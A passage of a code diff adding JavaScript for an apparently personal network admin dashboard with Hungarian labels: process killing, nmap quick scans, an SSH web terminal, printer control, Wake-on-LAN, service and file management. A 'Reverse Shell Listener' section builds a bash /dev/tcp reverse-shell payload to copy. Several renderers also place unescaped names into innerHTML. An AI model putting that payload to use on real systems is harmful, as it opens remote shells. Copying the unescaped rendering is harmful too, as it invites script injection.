+  out.innerHTML = lines.join('\n');
+  out.scrollTop = out.scrollHeight;
+}
+
+function highlightLog() { renderLog(); }
+
+function toggleLogAuto() {
+  const on = document.getElementById('log-auto').checked;
+  if (on) _logAutoTimer = setInterval(loadLog, 5000);
+  else { clearInterval(_logAutoTimer); _logAutoTimer = null; }
+}
+
+// ── Folyamatkezelő ───────────────────────────────────────────────────────────
+let _procMid = null, _procAutoTimer = null;
+let _procData = [], _procSort = 'cpu', _procAsc = false;
+
+function openProcs(mid, label) {
+  _procMid = mid;
+  document.getElementById('proc-label').textContent = label;
+  document.getElementById('proc-search').value = '';
+  document.getElementById('proc-auto').checked = false;
+  new bootstrap.Modal(document.getElementById('procModal')).show();
+  loadProcs();
+  document.getElementById('procModal').addEventListener('hidden.bs.modal', () => {
+    clearInterval(_procAutoTimer); _procAutoTimer = null;
+  }, {once:true});
+}
+
+function loadProcs() {
+  if (!_procMid) return;
+  fetch(`/api/processes/${_procMid}`)
+    .then(r => r.json())
+    .then(data => {
+      if (data.error) { document.getElementById('proc-tbody').innerHTML =
+        `<tr><td colspan="8" style="color:var(--red);padding:20px;text-align:center;">❌ ${data.error}</td></tr>`; return; }
+      _procData = data.processes || [];
+      renderProcs();
+    });
+}
+
+function renderProcs() {
+  const q    = document.getElementById('proc-search').value.toLowerCase();
+  const rows = _procData
+    .filter(p => !q || p.name.toLowerCase().includes(q) || p.cmd.toLowerCase().includes(q) || String(p.pid).includes(q))
+    .sort((a,b) => { const v = _procAsc ? 1 : -1; return (a[_procSort] > b[_procSort] ? 1 : -1) * v; });
+
+  document.getElementById('proc-count').textContent = `${rows.length} / ${_procData.length} folyamat`;
+  const tbody = document.getElementById('proc-tbody');
+
+  if (!rows.length) {
+    tbody.innerHTML = '';
+    document.getElementById('proc-empty').style.display = 'block';
+    return;
+  }
+  document.getElementById('proc-empty').style.display = 'none';
+
+  tbody.innerHTML = rows.map(p => {
+    const cpuClr = p.cpu >= 50 ? 'var(--red)' : p.cpu >= 10 ? 'var(--orange)' : 'var(--green)';
+    const memClr = p.mem >= 20 ? 'var(--orange)' : 'var(--muted)';
+    const sysProc = p.pid <= 2 || p.user === 'root' && p.cpu === 0 && p.mem === 0;
+    const statusClr = p.status === 'running' ? 'var(--green)' : p.status === 'sleeping' ? 'var(--muted)' : 'var(--yellow)';
+    return `<tr style="border-bottom:1px solid #30363d22;" onmouseover="this.style.background='#30363d30'" onmouseout="this.style.background=''">
+      <td style="padding:4px 10px;color:var(--muted);">${p.pid}</td>
+      <td style="padding:4px 6px;color:var(--muted);max-width:80px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">${p.user}</td>
+      <td style="padding:4px 6px;color:${cpuClr};font-weight:${p.cpu>5?'bold':'normal'};">${p.cpu.toFixed(1)}%</td>
+      <td style="padding:4px 6px;color:${memClr};">${p.mem.toFixed(1)}%</td>
+      <td style="padding:4px 6px;color:${statusClr};font-size:.65rem;">${p.status}</td>
+      <td style="padding:4px 6px;color:var(--text);font-weight:600;max-width:120px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;" title="${p.name}">${p.name}</td>
+      <td style="padding:4px 6px;color:var(--muted);max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-size:.68rem;" title="${p.cmd}">${p.cmd}</td>
+      <td style="padding:4px 10px;white-space:nowrap;">
+        ${sysProc ? '' : `
+          <button onclick="killProc(${p.pid},'${p.name}',false)" title="SIGTERM (graceful)"
+            style="background:transparent;border:1px solid var(--orange);color:var(--orange);border-radius:3px;padding:1px 6px;cursor:pointer;font-size:.65rem;margin-right:3px;">⏹</button>
+          <button onclick="killProc(${p.pid},'${p.name}',true)" title="SIGKILL (force)"
+            style="background:transparent;border:1px solid var(--red);color:var(--red);border-radius:3px;padding:1px 6px;cursor:pointer;font-size:.65rem;">💀</button>
+        `}
+      </td>
+    </tr>`;
+  }).join('');
+}
+
+function filterProcs() { renderProcs(); }
+
+function sortProcs(field) {
+  if (_procSort === field) _procAsc = !_procAsc;
+  else { _procSort = field; _procAsc = false; }
+  renderProcs();
+}
+
+function killProc(pid, name, force) {
+  const action = force ? 'FORCE KILL (SIGKILL)' : 'leállítás (SIGTERM)';
+  if (!confirm(`${action}: ${name} (PID ${pid})?`)) return;
+  fetch('/api/kill', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ machine: _procMid, pid, force }),
+  }).then(r => r.json()).then(data => {
+    if (data.error) alert('❌ ' + data.error);
+    else { setTimeout(loadProcs, 800); }
+  });
+}
+
+function toggleProcAuto() {
+  const on = document.getElementById('proc-auto').checked;
+  if (on) _procAutoTimer = setInterval(loadProcs, 5000);
+  else { clearInterval(_procAutoTimer); _procAutoTimer = null; }
+}
+
+// ── VNC / Screenshot előnézet ────────────────────────────────────────────────
+let _ssMachineId = null;
+let _ssAutoTimer = null;
+let _ssModal = null;
+
+function openScreenshot(mid, label) {
+  _ssMachineId = mid;
+  document.getElementById('ss-title').textContent = label + ' — képernyő';
+  document.getElementById('ss-auto').checked = false;
+  _ssModal = new bootstrap.Modal(document.getElementById('ssModal'));
+  _ssModal.show();
+  takeScreenshot();
+
+  document.getElementById('ssModal').addEventListener('hidden.bs.modal', () => {
+    clearInterval(_ssAutoTimer); _ssAutoTimer = null;
+    document.getElementById('ss-auto').checked = false;
+    document.getElementById('ss-img').style.display = 'none';
+    document.getElementById('ss-loading').style.display = 'block';
+    document.getElementById('ss-error').style.display = 'none';
+  }, { once: true });
+}
+
+function takeScreenshot() {
+  if (!_ssMachineId) return;
+  const img    = document.getElementById('ss-img');
+  const load   = document.getElementById('ss-loading');
+  const errEl  = document.getElementById('ss-error');
+  const btn    = document.getElementById('ss-refresh-btn');
+
+  load.style.display = 'block'; img.style.display = 'none'; errEl.style.display = 'none';
+  btn.textContent = '⏳';
+
+  fetch(`/api/screenshot/${_ssMachineId}`)
+    .then(r => r.json())
+    .then(data => {
+      btn.textContent = '↺ Frissít';
+      if (data.error) {
+        load.style.display = 'none';
+        errEl.style.display = 'block';
+        errEl.textContent = '❌ ' + data.error;
+      } else {
+        load.style.display = 'none';
+        img.src = data.image;
+        img.style.display = 'block';
+        document.getElementById('ss-time').textContent =
+          'Utolsó: ' + new Date().toLocaleTimeString('hu-HU');
+      }
+    })
+    .catch(e => {
+      btn.textContent = '↺ Frissít';
+      load.style.display = 'none';
+      errEl.style.display = 'block';
+      errEl.textContent = '❌ Hálózati hiba';
+    });
+}
+
+function toggleAutoSS() {
+  const on = document.getElementById('ss-auto').checked;
+  if (on) {
+    _ssAutoTimer = setInterval(takeScreenshot, 5000);
+  } else {
+    clearInterval(_ssAutoTimer); _ssAutoTimer = null;
+  }
+}
+
+// ── Gyorsparancsok ───────────────────────────────────────────────────────────
+const QUICK_CMDS = [
+  { label:'🔍 nmap gyors',      cmd:'nmap -F {host}',                    local:true  },
+  { label:'🔍 nmap részletes',  cmd:'nmap -sV -p 1-1024 {host}',        local:true  },
+  { label:'📡 Ping (4x)',       cmd:'ping -c 4 {host}',                  local:true  },
+  { label:'🔌 Nyitott portok',  cmd:'ss -tlnp',                          local:false },
+  { label:'👥 Felhasználók',    cmd:'who && last -n 10',                 local:false },
+  { label:'💾 Disk',            cmd:'df -h',                             local:false },
+  { label:'🔄 Top folyamatok',  cmd:'ps aux --sort=-%cpu | head -20',    local:false },
+  { label:'🌐 Kapcsolatok',     cmd:'ss -tnp',                           local:false },
+  { label:'🔒 SSH log',         cmd:'last -n 20',                        local:false },
+  { label:'📋 Syslog (30 sor)', cmd:'tail -n 30 /var/log/syslog',       local:false },
+  { label:'💻 Rendszerinfo',    cmd:'uname -a && uptime && free -h',     local:false },
+  { label:'🛡 Cron feladatok',  cmd:'crontab -l 2>/dev/null || echo "nincs"', local:false },
+];
+
+function buildCmdBtns() {
+  const cont = document.getElementById('cmd-btns');
+  cont.innerHTML = '';
+  QUICK_CMDS.forEach(c => {
+    const btn = document.createElement('button');
+    btn.textContent = c.label;
+    btn.style.cssText = 'background:var(--header);border:1px solid var(--border);color:var(--text);border-radius:5px;padding:4px 8px;cursor:pointer;font-size:.75rem;text-align:left;transition:.15s;';
+    btn.onmouseover = () => btn.style.borderColor = 'var(--green)';
+    btn.onmouseout  = () => btn.style.borderColor = 'var(--border)';
+    btn.onclick = () => runQuickCmd(c);
+    cont.appendChild(btn);
+  });
+}
+
+function getMachineHost(mid) {
+  const opts = document.getElementById('cmd-machine').options;
+  // Get host from latest_stats or fallback
+  return latestHosts[mid] || mid;
+}
+
+const latestHosts = {};  // mid → host IP (filled from config)
+{% for mid, m in machines.items() %}
+latestHosts['{{mid}}'] = '{{m.host}}';
+{% endfor %}
+
+function runQuickCmd(c) {
+  const mid = document.getElementById('cmd-machine').value;
+  let cmd = c.cmd;
+  let machine = mid;
+  if (c.local) {
+    const host = latestHosts[mid] || mid;
+    cmd = cmd.replace('{host}', host);
+    machine = 'local';
+  }
+  runCmd(cmd, machine, c.label);
+}
+
+function runCmd(cmd, machine, label) {
+  if (!cmd || !cmd.trim()) return;
+  machine = machine || document.getElementById('cmd-machine').value;
+  label   = label || cmd;
+  const out = document.getElementById('cmd-output');
+  const lbl = document.getElementById('cmd-run-label');
+  lbl.textContent = label + ' @ ' + machine;
+  out.style.color = '#8b949e';
+  out.textContent = '⏳ Futtatás...';
+
+  fetch('/api/exec', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ machine, command: cmd }),
+  })
+  .then(r => r.json())
+  .then(data => {
+    out.style.color = '#c9d1d9';
+    if (data.error) {
+      out.style.color = '#f85149';
+      out.textContent = '❌ ' + data.error;
+    } else {
+      out.textContent = data.output || '(üres kimenet)';
+    }
+    out.scrollTop = out.scrollHeight;
+  })
+  .catch(e => {
+    out.style.color = '#f85149';
+    out.textContent = '❌ Hálózati hiba: ' + e;
+  });
+}
+
+function clearCmdOutput() {
+  document.getElementById('cmd-output').textContent = 'Válassz parancsot...';
+  document.getElementById('cmd-run-label').textContent = '—';
+}
+
+function openCmds() {
+  buildCmdBtns();
+  new bootstrap.Modal(document.getElementById('cmdModal')).show();
+}
+
+// ── SSH Terminal ─────────────────────────────────────────────────────────────
+let termWs, term, fitAddon;
+
+function openTerm(mid, label) {
+  el('term-title').textContent = `SSH → ${label}`;
+  const wrap = el('term-wrap');
+  wrap.innerHTML = '';
+
+  term = new Terminal({
+    cursorBlink: true, fontSize: 14,
+    fontFamily: 'Consolas, Monaco, monospace',
+    theme: { background:'#000', foreground:'#c9d1d9', cursor:'#58a6ff', selectionBackground:'#3fb95040' },
+    scrollback: 1000,
+  });
+  fitAddon = new FitAddon.FitAddon();
+  term.loadAddon(fitAddon);
+  term.open(wrap);
+
+  const modal = new bootstrap.Modal(el('termModal'));
+  modal.show();
+
+  setTimeout(() => {
+    fitAddon.fit();
+    termWs = new WebSocket(`ws://${location.host}/ws/terminal/${mid}`);
+    termWs.binaryType = 'arraybuffer';
+
+    termWs.onopen = () => {
+      termWs.send(JSON.stringify({type:'resize', cols:term.cols, rows:term.rows}));
+    };
+    termWs.onmessage = evt => {
+      term.write(evt.data instanceof ArrayBuffer ? new Uint8Array(evt.data) : evt.data);
+    };
+    termWs.onclose = () => term.write('\r\n\x1b[31mKapcsolat lezárva.\x1b[0m\r\n');
+
+    term.onData(d => { if(termWs.readyState===1) termWs.send(new TextEncoder().encode(d)); });
+    term.onResize(({cols,rows}) => { if(termWs.readyState===1) termWs.send(JSON.stringify({type:'resize',cols,rows})); });
+    window.addEventListener('resize', () => fitAddon.fit());
+  }, 300);
+
+  el('termModal').addEventListener('hidden.bs.modal', () => {
+    if(termWs) termWs.close();
+    if(term)   term.dispose();
+  }, {once:true});
+}
+
+// ── Nyomtató ─────────────────────────────────────────────────────────────────
+let _printerFile = null;
+let _printerAutoTimer = null;
+let _lastPrinterData = null;
+
+function loadPrinterStatus() {
+  fetch('/api/printer')
+    .then(r => r.json())
+    .then(data => { _lastPrinterData = data; updatePrinterUI(data); })
+    .catch(() => updatePrinterUI({ available: false, online: false }));
+}
+
+function updatePrinterUI(data) {
+  const dot   = el('printer-dot');
+  const badge = el('printer-badge');
+
+  if (!data || !data.available || !data.online) {
+    if (dot)   dot.className = 'dot dot-off';
+    if (badge) { badge.textContent = 'OFFLINE'; badge.className = 'badge-off'; }
+    setText('printer-toner-pct', '—%');
+    setText('printer-status-text', 'Nem elérhető');
+    setText('printer-toner-name', '—');
+    setText('printer-job-count', '— feladat');
+    return;
+  }
+
+  if (dot)   dot.className = 'dot dot-on';
+  if (badge) { badge.textContent = 'ONLINE'; badge.className = 'badge-on'; }
+
+  const pct = (data.toner_pct !== null && data.toner_pct !== undefined) ? data.toner_pct : -1;
+  if (pct >= 0) {
+    setText('printer-toner-pct', pct + '%');
+    setText('printer-toner-name', data.toner_name || '');
+    const bar = el('printer-toner-bar');
+    if (bar) {
+      bar.style.width = pct + '%';
+      bar.className = 'toner-fill ' + (pct > 25 ? 'toner-ok' : pct > 10 ? 'toner-low' : 'toner-crit');
+    }
+  }
+
+  const _idle = ['idle','üresjárat','3'];
+  const _busy = ['printing','nyomtat','4','5'];
+  const statusTxt = _busy.includes(data.status) ? '🖨️ Nyomtat...' :
+                    _idle.includes(data.status)  ? '✓ Készen áll' :
+                    data.status === 'offline'    ? '⛔ Offline' : (data.status || '—');
+  const statusClr = _busy.includes(data.status) ? 'var(--orange)' :
+                    _idle.includes(data.status)  ? 'var(--green)'  : 'var(--muted)';
+  const stEl = el('printer-status-text');
+  if (stEl) { stEl.textContent = statusTxt; stEl.style.color = statusClr; }
+
+  const jc = (data.jobs || []).length;
+  setText('printer-job-count', jc + ' feladat');
+
+  const jl = el('printer-job-list');
+  if (jl) {
+    if (jc > 0) {
+      jl.style.display = 'block';
+      jl.innerHTML = (data.jobs || []).slice(0, 3).map(j =>
+        `<span style="font-size:.68rem;color:var(--muted);">
+          <span style="color:var(--text)">#${j.id}</span> ${j.title} — ${j.state||''}
+        </span><br>`
+      ).join('');
+    } else {
+      jl.style.display = 'none';
+    }
+  }
+
+  if (el('printerModal') && el('printerModal').classList.contains('show')) {
+    _updatePrinterModal(data);
+  }
+}
+
+function _updatePrinterModal(data) {
+  const pct = (data.toner_pct !== null && data.toner_pct !== undefined) ? data.toner_pct : -1;
+  if (pct >= 0) {
+    setText('pm-toner-pct', pct + '%');
+    const bar = el('pm-toner-bar');
+    if (bar) {
+      bar.style.width = pct + '%';
+      bar.className = 'toner-fill ' + (pct > 25 ? 'toner-ok' : pct > 10 ? 'toner-low' : 'toner-crit');
+    }
+    const pctEl = el('pm-toner-pct');
+    if (pctEl) pctEl.style.color = pct > 25 ? 'var(--green)' : pct > 10 ? 'var(--yellow)' : 'var(--red)';
+    setText('pm-toner-name', data.toner_name || '');
+  }
+
+  setText('pm-ip', data.ip || '—');
+  const onEl = el('pm-online');
+  if (onEl) {
+    onEl.textContent = data.online ? 'Elérhető' : 'Nem elérhető';
+    onEl.style.color = data.online ? 'var(--green)' : 'var(--red)';
+  }
+
+  const _idle2 = ['idle','üresjárat','3'];
+  const _busy2 = ['printing','nyomtat','4','5'];
+  const statusTxt = _busy2.includes(data.status) ? '🖨️ Nyomtat...' :
+                    _idle2.includes(data.status)  ? '✓ Készen áll' :
+                    data.status === 'offline'     ? '⛔ Offline' : (data.status || '—');
+  setText('pm-status', statusTxt);
+
+  const jobs = data.jobs || [];
+  setText('pm-jobs-count', jobs.length + ' db');
+
+  const jl = el('pm-job-list');
+  if (jl) {
+    if (!jobs.length) {
+      jl.innerHTML = '<div style="color:var(--muted);text-align:center;padding:12px;">Nincs feladat</div>';
+    } else {
+      jl.innerHTML = jobs.map(j => `
+        <div style="display:flex;justify-content:space-between;align-items:center;padding:4px 0;border-bottom:1px solid var(--border);">
+          <span><b>#${j.id}</b> ${j.title}
+            <span style="color:var(--muted);font-size:.65rem;margin-left:4px;">${j.state||''}</span>
+          </span>
+          <button onclick="cancelPrintJob(${j.id},'${j.title.replace(/'/g,"\\'")}') "
+            style="background:transparent;border:1px solid var(--red);color:var(--red);border-radius:3px;padding:1px 6px;cursor:pointer;font-size:.65rem;">Törlés</button>
+        </div>`).join('');
+    }
+  }
+}
+
+function openPrinter() {
+  const modal = new bootstrap.Modal(el('printerModal'));
+  modal.show();
+  if (_lastPrinterData) _updatePrinterModal(_lastPrinterData);
+  loadPrinterStatus();
+  el('printerModal').addEventListener('hidden.bs.modal', () => {
+    clearPrinterFile();
+    el('pm-print-status').textContent = '';
+  }, { once: true });
+}
+
+function handlePrinterFile(input) {
+  if (input.files && input.files[0]) {
+    _printerFile = input.files[0];
+    el('pm-file-name').textContent = _printerFile.name + ' (' + (_printerFile.size/1024).toFixed(1) + ' KB)';
+    el('pm-file-info').style.display = 'block';
+    el('pm-dropzone').style.borderColor = 'var(--orange)';
+  }
+}
+
+function handlePrinterDrop(event) {
+  event.preventDefault();
+  el('pm-dropzone').style.borderColor = 'var(--border)';
+  const files = event.dataTransfer.files;
+  if (files && files[0]) {
+    try {
+      const dt = new DataTransfer();
+      dt.items.add(files[0]);
+      el('pm-file').files = dt.files;
+      handlePrinterFile(el('pm-file'));
+    } catch(e) {
+      _printerFile = files[0];
+      el('pm-file-name').textContent = files[0].name;
+      el('pm-file-info').style.display = 'block';
+      el('pm-dropzone').style.borderColor = 'var(--orange)';
+    }
+  }
+}
+
+function clearPrinterFile() {
+  _printerFile = null;
+  el('pm-file').value = '';
+  el('pm-file-info').style.display = 'none';
+  el('pm-dropzone').style.borderColor = 'var(--border)';
+}
+
+function submitPrint() {
+  if (!_printerFile) {
+    el('pm-print-status').textContent = '❌ Válassz ki egy fájlt!';
+    el('pm-print-status').style.color = 'var(--red)';
+    return;
+  }
+  const copies = parseInt(el('pm-copies').value) || 1;
+  const duplex = el('pm-duplex').checked;
+  const btn = el('pm-print-btn');
+
+  btn.disabled = true;
+  btn.textContent = '⏳ Küldés...';
+  el('pm-print-status').textContent = '';
+
+  const fd = new FormData();
+  fd.append('file', _printerFile);
+  fd.append('copies', copies);
+  fd.append('duplex', duplex);
+
+  fetch('/api/printer/print', { method:'POST', body: fd })
+    .then(r => r.json())
+    .then(data => {
+      btn.disabled = false;
+      btn.innerHTML = '<i class="fas fa-print me-2"></i>Nyomtatás indítása';
+      if (data.error) {
+        el('pm-print-status').textContent = '❌ ' + data.error;
+        el('pm-print-status').style.color = 'var(--red)';
+      } else {
+        el('pm-print-status').textContent = '✓ Elküldve! Feladat azonosító: ' + (data.job_id || '—');
+        el('pm-print-status').style.color = 'var(--green)';
+        clearPrinterFile();
+        setTimeout(loadPrinterStatus, 1500);
+      }
+    })
+    .catch(() => {
+      btn.disabled = false;
+      btn.innerHTML = '<i class="fas fa-print me-2"></i>Nyomtatás indítása';
+      el('pm-print-status').textContent = '❌ Hálózati hiba';
+      el('pm-print-status').style.color = 'var(--red)';
+    });
+}
+
+function cancelPrintJob(jobId, title) {
+  if (!confirm(`Töröljük a(z) "${title}" feladatot?`)) return;
+  fetch('/api/printer/cancel', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ job_id: jobId }),
+  })
+    .then(r => r.json())
+    .then(data => {
+      if (data.error) alert('❌ ' + data.error);
+      else setTimeout(loadPrinterStatus, 800);
+    });
+}
+
+loadPrinterStatus();
+_printerAutoTimer = setInterval(loadPrinterStatus, 30000);
+
+// ── Tab navigáció ─────────────────────────────────────────────────────────────
+let _tabInit = {};
+function switchTab(name, btn) {
+  document.querySelectorAll('.tab-pane').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
+  const pane = document.getElementById('tab-' + name);
+  if (pane) pane.classList.add('active');
+  if (btn)  btn.classList.add('active');
+  if (!_tabInit[name]) {
+    _tabInit[name] = true;
+    if (name === 'control') { buildWolGrid(); loadServices(); }
+    if (name === 'files')   { fbNavigate('/home/wizardg'); }
+    if (name === 'network') { setTimeout(() => { loadPingMatrix(); loadTailscale(); loadNetTabMap(); }, 100); }
+    if (name === 'notes')   { loadNotes(); }
+  }
+}
+
+// ── WoL ──────────────────────────────────────────────────────────────────────
+{% for mid, m in machines.items() %}{% if m.get('mac') %}
+const _wol_{{mid}} = { label:'{{m.label}}', mac:'{{m.mac}}' };
+{% endif %}{% endfor %}
+const WOL_MACHINES = {
+  {% for mid, m in machines.items() %}{% if m.get('mac') %}
+  '{{mid}}': { label:'{{m.label}}', mac:'{{m.mac}}' },
+  {% endif %}{% endfor %}
+};
+
+function buildWolGrid() {
+  const grid = document.getElementById('wol-grid');
+  if (!grid) return;
+  const entries = Object.entries(WOL_MACHINES);
+  if (!entries.length) {
+    grid.innerHTML = '<div class="col-12" style="color:var(--muted);font-size:.78rem;padding:8px;">Nincs WoL-képes gép (add meg a "mac" mezőt a config.json-ban)</div>';
+    return;
+  }
+  grid.innerHTML = entries.map(([mid, m]) => `
+    <div class="col-xl-2 col-lg-3 col-md-4 col-6">
+      <div style="background:var(--header);border:1px solid var(--border);border-radius:8px;padding:12px;text-align:center;">
+        <div style="font-weight:700;color:var(--text);font-size:.82rem;margin-bottom:2px;">${m.label}</div>
+        <div style="font-size:.62rem;color:var(--muted);font-family:Consolas,monospace;margin-bottom:8px;">${m.mac}</div>
+        <button onclick="sendWol('${mid}')" id="wol-btn-${mid}"
+          style="background:var(--green);border:none;color:#000;border-radius:5px;padding:4px 0;cursor:pointer;font-size:.75rem;font-weight:600;width:100%;">⚡ Ébresztés</button>
+        <div id="wol-msg-${mid}" style="font-size:.65rem;color:var(--muted);margin-top:5px;min-height:14px;"></div>
+      </div>
+    </div>`).join('');
+}
+
+function sendWol(mid) {
+  const btn = el('wol-btn-'+mid), msg = el('wol-msg-'+mid);
+  if (btn) { btn.disabled = true; btn.textContent = '⏳'; }
+  fetch('/api/wol/'+mid, { method:'POST' })
+    .then(r => r.json()).then(data => {
+      if (btn) { btn.disabled = false; btn.textContent = '⚡ Ébresztés'; }
+      if (msg) {
+        msg.textContent = data.error ? '❌ ' + data.error : '✓ Magic packet elküldve';
+        msg.style.color = data.error ? 'var(--red)' : 'var(--green)';
+        setTimeout(() => { if(msg) msg.textContent = ''; }, 4000);
+      }
+    });
+}
+
+// ── Reverse Shell Listener ────────────────────────────────────────────────────
+let _rlWs = null, _rlTerm = null, _rlFit = null;
+
+function startListener() {
+  const port = document.getElementById('rl-port').value || '4444';
+  const tool = document.getElementById('rl-tool').value;
+  const wrap = document.getElementById('rl-term-wrap');
+
+  if (_rlTerm) { _rlTerm.dispose(); _rlTerm = null; }
+  wrap.innerHTML = '';
+  _rlTerm = new Terminal({
+    cursorBlink:true, fontSize:13, fontFamily:'Consolas,Monaco,monospace',
+    theme:{background:'#000',foreground:'#c9d1d9',cursor:'#f85149'},
+    scrollback:3000,
+  });
+  _rlFit = new FitAddon.FitAddon();
+  _rlTerm.loadAddon(_rlFit);
+  _rlTerm.open(wrap);
+  setTimeout(() => _rlFit && _rlFit.fit(), 80);
+
+  el('rl-start-btn').style.display = 'none';
+  el('rl-stop-btn').style.display  = 'inline-block';
+
+  const localIp = location.hostname;
+  const payloadEl = el('rl-payload');
+  if (payloadEl) payloadEl.textContent = `bash -i >& /dev/tcp/${localIp}/${port} 0>&1`;
+
+  _rlWs = new WebSocket(`ws://${location.host}/ws/listener`);
+  _rlWs.binaryType = 'arraybuffer';
+  _rlWs.onopen    = () => _rlWs.send(JSON.stringify({ port: parseInt(port), tool }));
+  _rlWs.onmessage = evt => _rlTerm && _rlTerm.write(
+    evt.data instanceof ArrayBuffer ? new Uint8Array(evt.data) : evt.data);
+  _rlWs.onclose   = () => {
+    _rlTerm && _rlTerm.write('\r\n\x1b[31m[NOX] Listener leállítva\x1b[0m\r\n');
+    el('rl-start-btn').style.display = 'inline-block';
+    el('rl-stop-btn').style.display  = 'none';
+  };
+  _rlTerm.onData(d => { if (_rlWs?.readyState === 1) _rlWs.send(new TextEncoder().encode(d)); });
+}
+
+function stopListener() {
+  if (_rlWs) { _rlWs.close(); _rlWs = null; }
+  el('rl-start-btn').style.display = 'inline-block';
+  el('rl-stop-btn').style.display  = 'none';
+}
+
+function copyRlPayload() {
+  const t = el('rl-payload')?.textContent;
+  if (!t) return;
+  navigator.clipboard.writeText(t).then(() => {
+    const e = el('rl-payload');
+    const orig = e.style.color;
+    e.style.color = 'var(--green)';
+    setTimeout(() => { e.style.color = orig; }, 1000);
+  });
+}
+
+// ── Service manager ───────────────────────────────────────────────────────────
+let _svcData = [], _svcMid = null;
+
+function loadServices() {
+  _svcMid = el('svc-machine')?.value;
+  if (!_svcMid) return;
+  const all  = el('svc-all')?.checked ? '1' : '0';
+  const cnt  = el('svc-count');
+  const list = el('svc-list');
+  if (cnt) cnt.textContent = '⏳';
+  list.innerHTML = '<div style="padding:16px;text-align:center;color:var(--muted);">⏳ Betöltés...</div>';
+
+  fetch(`/api/services/${_svcMid}?all=${all}`)
+    .then(r => r.json()).then(data => {
+      if (data.error) {
+        list.innerHTML = `<div style="padding:16px;color:var(--red);">❌ ${data.error}</div>`;
+        if (cnt) cnt.textContent = 'Hiba';
+        return;
+      }
+      _svcData = data.services || [];
+      if (cnt) cnt.textContent = `${_svcData.length} db`;
+      renderServices();
+    }).catch(() => {
+      list.innerHTML = '<div style="padding:16px;color:var(--red);">❌ Hálózati hiba</div>';
+    });
+}
+
+function renderServices() {
+  const q    = (el('svc-search')?.value || '').toLowerCase();
+  const list = el('svc-list');
+  const rows = _svcData.filter(s => !q || s.name.toLowerCase().includes(q));
+  if (!rows.length) {
+    list.innerHTML = '<div style="padding:16px;text-align:center;color:var(--muted);">Nincs találat</div>';
+    return;
+  }
+  list.innerHTML = rows.map(s => {
+    const cls  = s.active==='active'?'svc-active':s.active==='failed'?'svc-failed':'svc-inactive';
+    const icon = s.active==='active'?'●':s.active==='failed'?'✗':'○';
+    return `<div class="svc-row">
+      <span class="${cls}" style="width:12px;margin-right:8px;font-size:.7rem;">${icon}</span>
+      <span class="svc-name">${s.name}</span>
+      <span class="${cls}" style="font-size:.65rem;min-width:60px;text-align:center;margin-right:10px;">${s.sub||s.active}</span>
+      <div style="display:flex;gap:4px;">
+        <button class="btn-act" onclick="ctrlSvc('${s.name}','start')" title="Indítás">▶</button>
+        <button class="btn-act stop" onclick="ctrlSvc('${s.name}','stop')" title="Leállítás">⏹</button>
+        <button class="btn-act rst" onclick="ctrlSvc('${s.name}','restart')" title="Újraindítás">↺</button>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function filterServices() { renderServices(); }
+
+function ctrlSvc(name, action) {
+  if (!_svcMid) return;
+  if (action==='stop' && !confirm(`Leállítjuk: ${name}?`)) return;
+  fetch(`/api/service/${_svcMid}`, {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ name, action }),
+  }).then(r => r.json()).then(data => {
+    if (data.error) alert('❌ ' + data.error);
+    else setTimeout(loadServices, 1200);
+  });
+}
+
+// ── Fájlböngésző ─────────────────────────────────────────────────────────────
+function fbCurrentPath() { return el('fb-path')?.value || '/home/wizardg'; }
+
+function fbNavigate(path) {
+  const mid = el('fb-machine')?.value;
+  if (!mid) return;
+  el('fb-path').value = path;
+  const list = el('fb-list');
+  list.innerHTML = '<div style="padding:24px;text-align:center;color:var(--muted);">⏳ Betöltés...</div>';
+
+  fetch(`/api/files/${mid}?path=${encodeURIComponent(path)}`)
+    .then(r => r.json()).then(data => {
+      if (data.error) {
+        list.innerHTML = `<div style="padding:16px;color:var(--red);">❌ ${data.error}</div>`;
+        return;
+      }
+      _fbBreadcrumb(data.path);
+      _fbRender(data.path, data.entries || []);
+    });
+}
+
+function _fbBreadcrumb(path) {
+  const bc = el('fb-breadcrumb');
+  if (!bc) return;
+  const parts = path.split('/').filter(Boolean);
+  let html = `<span class="bc-part" onclick="fbNavigate('/')">/</span>`;
+  let acc = '';
+  parts.forEach(p => {
+    acc += '/' + p;
+    const a = acc;
+    html += `<span class="bc-sep">/</span><span class="bc-part" onclick="fbNavigate('${a}')">${p}</span>`;
+  });
+  bc.innerHTML = html;
+}
+
+function _fbRender(parentPath, entries) {
+  const list = el('fb-list');
+  const parentDir = parentPath.split('/').slice(0,-1).join('/') || '/';
+
+  const _esc = s => s.replace(/\\/g,'\\\\').replace(/'/g,"\\'");
+  let html = '';
+  if (parentPath !== '/') {
+    html += `<div class="file-row" onclick="fbNavigate('${_esc(parentDir)}')">
+      <span style="width:22px;margin-right:8px;text-align:center;">📂</span>
+      <span class="file-name" style="color:var(--muted);">..</span>
+    </div>`;
+  }
+  if (!entries.length && parentPath === '/') {
+    list.innerHTML = '<div style="padding:20px;text-align:center;color:var(--muted);">Üres könyvtár</div>';
+    return;
+  }
+  for (const e of entries) {
+    const icon = e.is_dir ? '📁' : _fbIcon(e.name);
+    const size = e.is_dir ? '' : fmtBytes(e.size);
+    const date = e.mtime ? new Date(e.mtime*1000).toLocaleString('hu-HU',
+      {month:'2-digit',day:'2-digit',hour:'2-digit',minute:'2-digit'}) : '';
+    const click = e.is_dir
+      ? `fbNavigate('${_esc(e.path)}')`
+      : `fbDownload('${_esc(e.path)}')`;
+    html += `<div class="file-row" onclick="${click}">
+      <span style="width:22px;margin-right:8px;text-align:center;font-size:.95rem;">${icon}</span>
+      <span class="file-name">${e.name}</span>
+      <span class="file-size">${size}</span>
+      <span class="file-date">${date}</span>
+      ${!e.is_dir
+        ? `<div style="display:flex;gap:3px;" onclick="event.stopPropagation()">
+            <button onclick="fbPullToServer('${_esc(e.path)}',this)" title="Másolás a server ~/Downloads mappájába"
+              style="background:transparent;border:1px solid var(--green);color:var(--green);border-radius:3px;padding:1px 7px;cursor:pointer;font-size:.65rem;">📥</button>
